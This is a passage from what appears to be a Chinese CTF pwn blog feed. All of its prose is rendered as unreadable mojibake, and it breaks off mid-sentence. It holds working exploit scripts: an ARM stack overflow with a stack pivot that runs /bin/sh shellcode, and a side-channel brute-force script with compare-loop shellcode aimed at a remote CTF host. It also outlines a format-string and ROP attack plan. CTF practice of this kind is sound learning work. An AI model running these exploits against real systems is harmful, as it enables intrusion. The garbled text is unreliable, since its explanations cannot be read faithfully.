è¯·è‡ªä¸»è°ƒè¯•ï¼Œè¿™é‡Œè€ƒå¯Ÿäº†è‡ªä¸»è°ƒè¯•æ¥å¸ƒå±€payloadï¼ˆå¦‚æœä½ å¯ä»¥çœ¼ç›çœ‹å‡ºæ¥payloadæ•´ä½“å¸ƒå±€çš„è¯ï¼Œå½“æˆ‘ä»€ä¹ˆéƒ½æ²¡è¯´ï¼‰ï¼Œå¦‚æœè¿è¿™é‡Œåˆ°æœ€åéƒ½ä¸ç†è§£è€Œä¸”è¿˜ç¨€é‡Œç³Šæ¶‚çš„äº¤äº†flagçš„è¯ï¼Œé‚£åšè¿™é“é¢˜æ˜¯æ¯«æ— æ„ä¹‰çš„ã€‚</p><p>å¤§è‡´æ€è·¯å°±æ˜¯è¿™æ ·ï¼ˆç¬¬äºŒæ¬¡è¾“å…¥å¸ƒç½®shellcodeï¼Œç„¶åæ§åˆ¶PCå¯„å­˜å™¨ï¼Œå°†å…¶æŒ‡å‘shellcodeçš„ä½ç½®ï¼‰å‰©ä¸‹çš„å…·ä½“ç»†èŠ‚çœŸçš„æ²¡æœ‰åŠæ³•è®°å½•ï¼Œå› ä¸ºå‰©ä¸‹çš„å¸ƒå±€éƒ½æ˜¯ä¸€ç‚¹ä¸€ç‚¹è°ƒè¯•å‡ºæ¥çš„ã€‚</p><h2 id="å…³äºå¯¹è°ƒè¯•èƒ½åŠ›çš„æ€»ç»“ï¼š"><a href="#å…³äºå¯¹è°ƒè¯•èƒ½åŠ›çš„æ€»ç»“ï¼š" class="headerlink" title="å…³äºå¯¹è°ƒè¯•èƒ½åŠ›çš„æ€»ç»“ï¼š"></a>å…³äºå¯¹è°ƒè¯•èƒ½åŠ›çš„æ€»ç»“ï¼š</h2><p>æˆ‘è¿™é‡Œè¯´ä¸€ä¸‹æˆ‘ä»åˆšå¼€å§‹å­¦pwnï¼Œåˆ°ç°åœ¨ä¹Ÿåˆšå¥½æ˜¯å››ä¸ªæœˆäº†ã€‚æ€»ç»“äº†ä¸€ä¸‹çš„è°ƒè¯•ç»éªŒï¼ˆæœ‰å¯èƒ½åœ¨å„ä½å¸ˆå‚…é¢å‰ç®—æ˜¯ç­é—¨å¼„æ–§äº†ï¼Œä½†è¿™ä¾ç„¶æ˜¯å¯¹è¿™å››ä¸ªæœˆæ‰€æŒæ¡çš„è°ƒè¯•èƒ½åŠ›çš„ä¸€ä¸ªè®°å½•ï¼‰ã€‚</p><p>ç¬¬ä¸€ï¼Œä½ è¦æ—¶åˆ»æ¸…æ¥šä½ è‡ªå·±æƒ³è¦çœ‹çš„å†…å®¹ä»¥åŠè‡ªå·±å¡åœ¨äº†å“ªé‡Œ</p><p>ç¬¬äºŒï¼Œåœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­ï¼Œé‡åˆ°å¡ä½çš„åœ°æ–¹ï¼Œè¦æ€è€ƒä¸ºä»€ä¹ˆä¼šè¿™æ ·ã€‚</p><p>ç¬¬ä¸‰ï¼Œåœ¨é”»ç‚¼è°ƒè¯•èƒ½åŠ›çš„æ—¶å€™ï¼Œåˆšå¼€å§‹æœ‰çš„åœ°æ–¹å¯èƒ½ä¸çŸ¥é“å¡ä½çš„åŸå› æ˜¯ä»€ä¹ˆï¼Œå»ºè®®æ‰¾ä¸€ä»½å¯ä»¥æ‰“é€šï¼ˆå’Œä½ æ€è·¯ç›¸è¿‘çš„ï¼‰çš„expï¼Œå»è°ƒè¯•ä¸€ä¸‹ï¼Œå†åå¤å¯¹æ¯”è‡ªå·±expçš„åŠ¨æ€è°ƒè¯•ï¼Œè¿™æ ·å¾ˆå®¹æ˜“æ‰¾åˆ°é—®é¢˜ã€‚</p><p>ç¬¬å››ï¼Œå°±æ˜¯å¯èƒ½ä½ è®¤ä¸ºä½ çš„æ€è·¯å¾ˆå¯¹ï¼Œä½†å°±æ˜¯æ‰“ä¸é€šï¼Œè€Œåˆ«äººçš„æ€è·¯éƒ½å’Œä½ çš„ä¸ä¸€æ ·ï¼Œ<strong>ç”±è¡·å»ºè®®ï¼Œä¸è¦æ”¾å¼ƒä½ çš„æ€è·¯ï¼Œåˆ°æœ€åæ— éæ˜¯ä¸¤ç§å¯èƒ½ï¼Œä½ é€šè¿‡åšæŒä»¥åŠæ€è€ƒæ‰“é€šäº†è‡ªå·±çš„expï¼Œåˆæˆ–è€…æ˜¯ä½ é€šè¿‡åå¤è°ƒè¯•ï¼Œæœ€åå‘ç°è‡ªå·±çš„æ€è·¯æ˜¯é”™è¯¯çš„ï¼Œä¸å¯è¡Œçš„ã€‚ä½†å…¶å®ä¸è®ºç»“æœï¼Œè¿™ä¸ªåšæŒçš„è¿‡ç¨‹å·²ç»è®©ä½ çš„è°ƒè¯•èƒ½åŠ›æœ‰äº†ä¸å°çš„è¿›æ­¥ã€‚</strong></p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;arm&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26705)</span></span><br><span class="line"><span class="comment">#p=process([&quot;qemu-arm&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabihf&quot;, &quot;./armup_buu&quot;])</span></span><br><span class="line">p=process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./armup_buu&quot;</span>])</span><br><span class="line">e=ELF(<span class="string">&#x27;./armup_buu&#x27;</span>)</span><br><span class="line">bss_addr=<span class="number">0x21000</span>+<span class="number">0x600</span></span><br><span class="line">read_addr=<span class="number">0x0001052C</span></span><br><span class="line">offset=<span class="number">100</span></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">payload=offset*<span class="string">&#x27;a&#x27;</span>+p32(bss_addr+<span class="number">0x68</span>)+p32(read_addr)<span class="comment">#å› ä¸ºsubå‡å»äº†0x68ï¼Œæ‰€ä»¥è¿™é‡Œæå‰åŠ ä¸Š0x68</span></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">shellcode=p32(<span class="number">0</span>)+p32(bss_addr+<span class="number">8</span>)+asm(shellcraft.sh())</span><br><span class="line">payload=shellcode</span><br><span class="line">payload=payload.ljust(<span class="number">0x64</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p32(bss_addr+<span class="number">4</span>)+p32(<span class="number">0x10548</span>)<span class="comment">#bss_addr+4æ˜¯å°†spè®¾ç½®æˆbss_addrï¼ˆä¸è¿‡è¿™ä¸€æ­¥åªæ˜¯å°†å‚æ•°ç»™R11ï¼Œå°†spèµ‹å€¼æ˜¯ä¸‹é¢çš„æ“ä½œï¼‰    å°†pcè®¾ç½®ä¸º0x10548çš„ç›®çš„æ˜¯å†æ‰§è¡Œä¸€é SUB     SP, R11     POP     &#123;R11,PC&#125;</span></span><br><span class="line"><span class="comment">#è¿™æ ·æ¥ä¿®æ”¹spçš„å€¼ï¼Œå¦‚æœä¸ä¿®æ”¹spçš„å€¼çš„è¯ï¼Œæ‰§è¡Œshellcodeçš„æ—¶å€™ï¼Œæœ‰ä¸ªæŒ‡ä»¤ä¼šå°†æ ˆé‡Œï¼ˆæ­¤æ—¶æ˜¯bssæ®µï¼‰çš„å€¼ä¿®æ”¹ï¼Œä»è€Œå¯¼è‡´shellcodeæ‰§è¡Œå¤±è´¥ã€‚</span></span><br><span class="line"><span class="comment">#ä¸Šè¿°çš„å†…å®¹ç”¨ä¸€å¥è¯è¯´å°±æ˜¯ï¼Œè¦å°†æ ˆè¿ç§»åˆ°æ‰§è¡Œæµçš„åœ°æ–¹ã€‚ä¸ç„¶shellcodeä¼šæŠŠè‡ªèº«ç»™ç ´åäº†... è¦æ˜¯ä¸ç›¸ä¿¡çš„è¯ï¼Œå¯ä»¥ä¸è¦è¿™ä¸¤ä¸ªæŒ‡ä»¤ï¼Œç„¶åè°ƒè¯•ä¸€ä¸‹ï¼Œå°±æ˜ç™½å’‹å›äº‹äº†</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ARMæ¶æ„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºä¾§ä¿¡é“çˆ†ç ´çš„å­¦ä¹ æ€»ç»“</title>
      <link href="/posts/82a683c0.html"/>
      <url>/posts/82a683c0.html</url>
      
        <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯ä¾§ä¿¡é“çˆ†ç ´ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯ä¾§ä¿¡é“çˆ†ç ´ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ä¾§ä¿¡é“çˆ†ç ´ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ä¾§ä¿¡é“çˆ†ç ´ï¼Ÿ</h2><p>ä¾§ä¿¡é“æ”»å‡»æ˜¯ä¸€ç§éå¸¸æœ‰è¶£çš„æ”»å‡»æ‰‹æ³•ï¼Œåœ¨pwnä¸­é€šå¸¸ä¸ºä¾§ä¿¡é“çˆ†ç ´ã€‚æˆ‘çš„ç†è§£æ˜¯ä¾§ä¿¡é“çˆ†ç ´æ˜¯æŒ‡åœ¨ç¨‹åºæ²¡æœ‰æ­£å¸¸å›æ˜¾çš„æƒ…å†µä¸‹é€šè¿‡æ‰§è¡Œç²¾å¿ƒæ„é€ åçš„æ•°æ®ï¼Œè·å–ä¸€äº›ç¨‹åºçš„ç°è±¡æˆ–åé¦ˆæ¥ç¡®å®šæœ€ç»ˆæ­£ç¡®çš„flagï¼Œè¿™ç§åé¦ˆæ¯”å¦‚æœ‰ç¨‹åºå›æ˜¾çš„é”™è¯¯ï¼Œæˆ–è€…æ­»å¾ªç¯ç­‰ç­‰ã€‚</p><blockquote><p>ä½¿ç”¨å‰æï¼š</p><p>1ã€ä¾§ä¿¡é“çˆ†ç ´éœ€è¦æ‰§è¡Œæˆ‘ä»¬ç¼–å†™çš„shellcode(å› ä¸ºç¨‹åºä¸­å¿…ç„¶æ— æ³•æ‰¾åˆ°å…¨éƒ¨å¯¹åº”çš„gadget)ï¼Œå› æ­¤èƒ½å¤Ÿå†™å…¥å’Œæ‰§è¡Œä¸€å®šå­—èŠ‚çš„shellcodeæ˜¯å¿…è¦çš„</p><p>2ã€ç¨‹åºåœ¨ç¦ç”¨äº†execveç³»ç»Ÿè°ƒç”¨åï¼ŒåŒæ—¶å…³é—­äº†æ ‡å‡†è¾“å‡ºæµåï¼Œæ‰æœ‰å¿…è¦ä½¿ç”¨ä¾§ä¿¡é“çˆ†ç ´ã€‚</p><p>3ã€åŒæ—¶<strong>æ ‡å‡†é”™è¯¯ä¸èƒ½è¢«å…³é—­</strong>(å› ä¸ºæˆ‘ä»¬éœ€è¦å®ƒæ¥åé¦ˆä¿¡æ¯)ï¼Œè¿˜å¿…é¡»è¦ä¿è¯readå¯ä»¥ä»æŒ‡å®šæ–‡ä»¶ä¸­è¯»å–flagï¼Œopenæˆ–è€…openatç³»ç»Ÿè°ƒç”¨è¦ä¿è¯è‡³å°‘æœ‰ä¸€ä¸ªå¯ç”¨ã€‚</p><p>æ”»å‡»æ•ˆæœï¼šåœ¨ç¨‹åºç¦ç”¨äº†éƒ¨åˆ†ç³»ç»Ÿè°ƒç”¨å¹¶ä¸”å…³é—­äº†æ­£å¸¸å›æ˜¾åï¼Œé€šè¿‡ç¨‹åºåé¦ˆçš„ä¿¡æ¯å¯¹è¿›è¡Œflagé€ä½çˆ†ç ´ã€‚</p></blockquote><h2 id="ä¾§ä¿¡é“çˆ†ç ´çš„æ•´ä½“æ€è·¯"><a href="#ä¾§ä¿¡é“çˆ†ç ´çš„æ•´ä½“æ€è·¯" class="headerlink" title="ä¾§ä¿¡é“çˆ†ç ´çš„æ•´ä½“æ€è·¯:"></a>ä¾§ä¿¡é“çˆ†ç ´çš„æ•´ä½“æ€è·¯:</h2><p>é¦–å…ˆéœ€è¦æƒ³åŠæ³•åœ¨ç¨‹åºä¸­å†™å…¥ä¸€æ®µshellcodeå¹¶ä¸”èƒ½å°†å…¶æ‰§è¡Œã€‚ç„¶åæˆ‘ä»¬å…ˆæ‰§è¡Œopenç³»ç»Ÿè°ƒç”¨(å¦‚æœopenè¢«ç¦ç”¨çš„è¯å¯ä»¥ä½¿ç”¨openatç³»ç»Ÿè°ƒç”¨)ï¼Œå°†flagæ–‡ä»¶æ‰“å¼€è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œç„¶åç”¨readç³»ç»Ÿè°ƒç”¨å°†æ–‡ä»¶ä¸­çš„å†…å®¹è¯»åˆ°ä¸€ç‰‡å¯è¯»å†™çš„å†…å­˜ä¸Šï¼Œç„¶åå¸ƒç½®ä¸€æ®µä¸flagæ¯”è¾ƒçš„shellcodeï¼Œè¿™æ®µshellcodeçš„ç¼–å†™æ€è·¯å¦‚ä¸‹ã€‚</p><p>é¦–å…ˆæ ¸å¿ƒæ˜¯ç”¨cmpæŒ‡ä»¤å°†è¯»å…¥å†…å­˜ä¸­çš„flagå–ä¸€ä½æ¥ä¸æˆ‘ä»¬ç»™å‡ºçš„ä¸€ä¸ªå­—ç¬¦åšå¯¹æ¯”ï¼Œå¦‚æœå‘ç°flagå–çš„è¿™ä¸€ä½ä¸æˆ‘ä»¬ç»™å‡ºçš„å­—ç¬¦ä¸€æ ·å°±è·³å›åˆ°cmpæŒ‡ä»¤å¤„ï¼Œå› ä¸ºå­—ç¬¦éƒ½æ²¡å˜åŒ–ï¼Œcmpæ¯”è¾ƒåè¿˜æ˜¯åŒæ ·çš„ç»“æœï¼Œå†æ¬¡è·³è½¬å›cmpæŒ‡ä»¤å¤„ï¼Œè¿™æ ·æ— é™å¾ªç¯ç¨‹åºä¸ä¼šæœ‰ä»»ä½•çš„å›æ˜¾ã€‚å¦‚æœcmpæ¯”è¾ƒåå‘ç°flagå–ä¸€ä½å¾—åˆ°çš„å­—ç¬¦ä¸æˆ‘ä»¬æ‰€ç»™çš„å­—ç¬¦ä¸åŒï¼Œå°±ä¸è¿›è¡Œè·³è½¬ç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼Œæˆ‘ä»¬ä¸åœ¨åé¢å¸ƒç½®ä»»ä½•çš„æŒ‡ä»¤ï¼Œè¿™æ ·ç¨‹åºç»§ç»­å¾€åæ‰§è¡Œï¼Œæœ€ç»ˆå¿…ç„¶ä¼šå´©æºƒã€‚è€Œæˆ‘ä»¬æ ¹æ®ç¨‹åºåœ¨ä¸€å®šæ—¶é—´å†…æ˜¯å¦åé¦ˆäº†å´©æºƒä¿¡æ¯æ¥åˆ¤æ–­æˆ‘ä»¬çš„flagæ˜¯å¦åˆ¤æ–­æ­£ç¡®(ç”¨jeæˆ–è€…jzæŒ‡ä»¤æ¥å®ç°è¿™ä¸ªè·³è½¬)</p><p>ä¸Šé¢è¿™æ®µä¸flagå¯¹æ¯”çš„shellcodeå¦‚ä¸‹ï¼š</p><p><strong>(è¿™æ®µshellcodeç¬¬ä¸€è¡Œå¹¶ä¸é€šç”¨ï¼Œæˆ‘ä»¬éœ€è¦è‡ªå·±æ ¹æ®é¢˜ç›®çš„æƒ…å†µå°†flagå­—ç¬¦ä¸²çš„é¦–åœ°å€æ”¾å…¥raxï¼Œåé¢çš„ä¸‰è¡Œæ±‡ç¼–æŒ‡ä»¤æ‰æ˜¯é€šç”¨çš„)</strong>  å¦å¤–æ±‡ç¼–æŒ‡ä»¤æœ¬èº«ä¸­çš„{}è‡ªç„¶æ˜¯éæ³•çš„ï¼Œè¿™é‡Œæ‰€å‡ºç°çš„{}æ˜¯é…åˆpythonè„šæœ¬ä¸­çš„formatæ–¹æ³•(è¿™ä¸ª{}åˆ™æ˜¯åœ¨çˆ†ç ´ä¸­çš„å˜é‡ï¼Œå› æ­¤éœ€è¦å ä½ç¬¦)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,rsi</span><br><span class="line">mov bl,byte ptr [rax+&#123;&#125;]</span><br><span class="line">cmp bl,&#123;&#125;</span><br><span class="line">je $-3</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€è¡Œå°±æ˜¯å°†flagå­—ç¬¦ä¸²çš„é¦–åœ°å€ç»™rax(è¿™ä¸€è¡Œå¹¶ä¸é€šç”¨ï¼Œæ ¹æ®é¢˜ç›®è‡ªè¡Œä¿®æ”¹)ã€‚</p><p>ç¬¬äºŒè¡Œå°†flagä¸­çš„æŸä¸€ä½å–å‡ºã€‚{}æ˜¯ç›¸å¯¹äºflagé¦–åœ°å€çš„åç§»ï¼Œç”¨æ¥ç¡®å®šåˆ°åº•æ˜¯å–å“ªä¸€ä½ã€‚é€šä¿—æ¥å°†ç¬¬äºŒè¡Œçš„{}å†³å®šäº†æ­£åœ¨çˆ†ç ´çš„æ˜¯flagçš„å“ªä¸€ä½ã€‚</p><p>ç¬¬ä¸‰è¡Œåˆ™å°†æˆ‘ä»¬ç»™å‡ºçš„å­—ç¬¦ä¸flagä¸­çš„æŸä¸€ä½è¿›è¡Œæ¯”è¾ƒ</p><p>ç¬¬å››è¡Œå¦‚æœcmpæ¯”è¾ƒæ—¶ï¼ŒäºŒè€…ä¸ç›¸åŒå°±ä¸ä¼šè·³è½¬ã€‚å¦‚æœç›¸åŒçš„è¯å°±å°†è·³åˆ°å½“å‰æŒ‡ä»¤çš„åœ°å€-3çš„ä½ç½®ï¼Œè€Œcmpé‚£ä¸ªæŒ‡ä»¤çš„æœºå™¨ç å°±æ˜¯ä¸‰å­—èŠ‚ï¼Œå› æ­¤-3åˆå›åˆ°äº†cmpæ‰§è¡Œå‰ã€‚ç”±äºæˆ‘ä»¬ç»™å‡ºçš„å­—ç¬¦æ²¡æœ‰å˜ï¼Œæ‰€ä»¥å°†æ— é™å¾ªç¯ä¸‹å»ã€‚</p><p>ä¸Šè¿°çš„å†…å®¹ä¸ºæ ¸å¿ƒæ­¥éª¤ï¼Œæœ€åæ•´ä½“çš„è¯éœ€è¦ç”¨ä¸¤ä¸ªå¾ªç¯åµŒå¥—ä¸€ä¸‹ï¼Œå¤§å¾ªç¯ä¸ºwhile 1**(ä¹Ÿå°±æ˜¯ä¸æ–­å¾ªç¯ä¸‹å»ï¼Œè¿™ä¸ªå¾ªç¯æ¯èµ°å®Œä¸€æ¬¡å°±è¯´æ˜flagå·²ç»çˆ†ç ´å‡ºäº†ä¸€ä½)<strong>ï¼Œå°å¾ªç¯ä¸ºforå¾ªç¯éå†æˆ‘ä»¬ç»™å‡ºflagä¸­å¯èƒ½å‡ºç°çš„å­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²</strong>(è¿™ä¸ªå¾ªç¯èµ°ä¸€æ¬¡å°±è¯´æ˜å¯¹flagä¸­çš„æŸä¸€ä½è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœåˆ¤æ–­æ­£ç¡®çš„è¯(ä¹Ÿå°±æ˜¯é™·å…¥äº†æ­»å¾ªç¯)å°±breakè·³å‡ºå½“å‰å¾ªç¯ï¼Œå¦åˆ™ç»§ç»­éå†å­—ç¬¦ä¸²)**</p><p>å…·ä½“çš„è¯ç»“åˆç›¸å…³é¢˜ç›®ç»ƒä¹ ä¸€ä¸‹å§</p><h2 id="ç›¸å…³ä¾‹é¢˜ï¼š"><a href="#ç›¸å…³ä¾‹é¢˜ï¼š" class="headerlink" title="ç›¸å…³ä¾‹é¢˜ï¼š"></a>ç›¸å…³ä¾‹é¢˜ï¼š</h2><h3 id="xman-2019-nooocall"><a href="#xman-2019-nooocall" class="headerlink" title="xman_2019_nooocall"></a>xman_2019_nooocall</h3><h4 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h4><p><img src="/../img/image-20220803100743845.png" alt="image-20220803100743845"></p><p>å‘ç°ä¿æŠ¤å…¨å¼€ï¼Œå¹¶ä¸”æ²™ç®±ç¦ç”¨äº†æ‰€æœ‰çš„ç³»ç»Ÿè°ƒç”¨ã€‚</p><h4 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h4><p><img src="/../img/image-20220803100927931.png" alt="image-20220803100927931"></p><p>è™½ç„¶ç³»ç»Ÿè°ƒç”¨éƒ½ç¦ç”¨äº†ï¼Œä½†ç¨‹åºè‡ªå·±å°†flagè¯»åˆ°äº†v5çš„ä½ç½®ï¼Œå› æ­¤è¿˜æ˜¯å¯ä»¥ä½¿ç”¨ä¾§ä¿¡é“çˆ†ç ´çš„ã€‚å¯ä»¥å‘ç°ç¨‹åºè‡ªå·±è¯»å…¥äº†16ä¸ªå­—èŠ‚çš„shellcodeï¼Œå¹¶å°†å…¶æ‰§è¡Œã€‚è¿™å°±çº¯çº¯è€ƒçš„ä¾§ä¿¡é“çˆ†ç ´äº†ï¼Œä¸‹é¢å°±ç›´æ¥æ”¾è„šæœ¬äº†ï¼Œæ¯•ç«Ÿæ€è·¯å•¥çš„ä¸Šé¢å·²ç»è¯´è¿‡äº†ã€‚</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">s = <span class="string">&quot;&#123;&#125;-abcdefghijl01234567898&quot;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="built_in">ord</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> s]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">add al, 2</span></span><br><span class="line"><span class="string">sal rax, 32</span></span><br><span class="line"><span class="string">mov bl, byte ptr [rax+&#123;&#125;]</span></span><br><span class="line"><span class="string">cmp bl, &#123;&#125;</span></span><br><span class="line"><span class="string">jz $-0x3 </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="comment"># debug(p,&#x27;pie&#x27;,0xD87)</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28383</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Your Shellcode &gt;&gt;&#x27;</span>, asm(shellcode.<span class="built_in">format</span>(index, <span class="built_in">list</span>[i])))</span><br><span class="line">        judge = p.recv(timeout=<span class="number">2</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> judge:</span><br><span class="line">            <span class="comment">#log_info(&#x27;success!&#x27;)</span></span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="built_in">list</span>[i])</span><br><span class="line">            log_info(flag)</span><br><span class="line">            index = index + <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> judge:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="comment">#log_info(&#x27;wrong!&#x27;)</span></span><br><span class="line">    <span class="comment">#log_info(flag)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>â€‹<img src="/../img/image-20220803102650387.png" alt="image-20220803102650387"></p><h3 id="ctfshow-å·ç‹æ¯-checkin"><a href="#ctfshow-å·ç‹æ¯-checkin" class="headerlink" title="ctfshow-å·ç‹æ¯-checkin"></a>ctfshow-å·ç‹æ¯-checkin</h3><h4 id="ä¿æŠ¤ç­–ç•¥-1"><a href="#ä¿æŠ¤ç­–ç•¥-1" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h4><p><img src="/../img/image-20220803103106146.png" alt="image-20220803103106146"></p><p><img src="/../img/image-20220803103501444.png" alt="image-20220803103501444"></p><p>è¿™é¢˜winmtå¸ˆå‚…æœ¬æ„è€ƒçš„æ˜¯ä¾§ä¿¡é“çˆ†ç ´ï¼Œä½†æ˜¯å¿˜è®°ç¦ç”¨execveç³»ç»Ÿè°ƒç”¨äº†å“ˆå“ˆã€‚è¿™é‡Œæˆ‘åªè®°å½•ä¾§ä¿¡é“çˆ†ç ´çš„æ–¹æ³•ã€‚</p><h4 id="æ¼æ´åˆ†æï¼š"><a href="#æ¼æ´åˆ†æï¼š" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h4><p><img src="/../img/image-20220803103711730.png" alt="image-20220803103711730"></p><p>å­˜åœ¨ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¾ˆæ˜æ˜¾è¿™é‡Œè‚¯å®šæ˜¯æ¥æ³„éœ²åœ°å€çš„ï¼Œç„¶åç¬¬äºŒä¸ªreadä¸Šå­˜åœ¨æº¢å‡ºï¼Œä½†æ˜¯æº¢å‡ºå­—èŠ‚è¾ƒå°‘å› æ­¤è‚¯å®šè¦æ‰“ä¸€ä¸ªæ ˆè¿ç§»ï¼Œç„¶åæˆ‘ä»¬ç”¨%p%25$pæ¥æ³„éœ²æ ˆåœ°å€å’Œlibcåœ°å€ã€‚</p><h4 id="å¤§è‡´æ€è·¯ï¼š"><a href="#å¤§è‡´æ€è·¯ï¼š" class="headerlink" title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h4><p>è¿ç§»åˆ°ç¬¬äºŒæ¬¡readå†™å…¥çš„æ•°æ®ä¸Šï¼Œå…ˆæ‰§è¡Œmprotectå‡½æ•°è®©æ­¤å¤„çš„æ ˆåŒºå˜æˆå¯è¯»å¯å†™å¯æ‰§è¡Œã€‚å› ä¸ºè¿™0x90çš„å­—èŠ‚ä¸å¤Ÿå¸ƒç½®ropé“¾çš„å› æ­¤å†ç”¨readç³»ç»Ÿè°ƒç”¨æ¥è¯»å…¥ä¸€æ¬¡æ•°æ®åˆ°æ ˆä¸Š(è¿™æ¬¡æ•°æ®çš„æ•°é‡æˆ‘ä»¬æ˜¯å¯æ§çš„)ã€‚</p><p>æ¥ä¸‹æ¥çš„ç¬¬äºŒæ¬¡ropé“¾ï¼Œæœ‰ä¸¤ä¸ªé—®é¢˜ï¼Œç¬¬ä¸€ä¸ªæ˜¯openç³»ç»Ÿè°ƒç”¨è¢«ç¦ç”¨äº†æ‰€ä»¥æˆ‘ä»¬ç”¨openatæ¥ä»£æ›¿ï¼Œç¬¬äºŒä¸ªé—®é¢˜å°±æ˜¯å¦‚æœæ‰§è¡Œreadç³»ç»Ÿè°ƒç”¨é‚£ä¹ˆå®ƒçš„æ–‡ä»¶æè¿°ç¬¦å¿…é¡»æ˜¯0ï¼Œå› æ­¤é‡‡ç”¨çš„å¯¹æŠ—ç­–ç•¥æ˜¯å°†æ ‡å‡†è¾“å…¥ç”¨closeå…³é—­ï¼Œç„¶åå†ç”¨openatæ‰“å¼€flagæ–‡ä»¶ï¼Œæ­¤æ—¶è¿”å›çš„æ–‡ä»¶æè¿°ç¬¦å°±æ˜¯0äº†ã€‚ç„¶åå°±æ˜¯readå°†flagè¯»å‡ºæ¥ï¼Œç„¶åç”¨ä¾§ä¿¡é“çˆ†ç 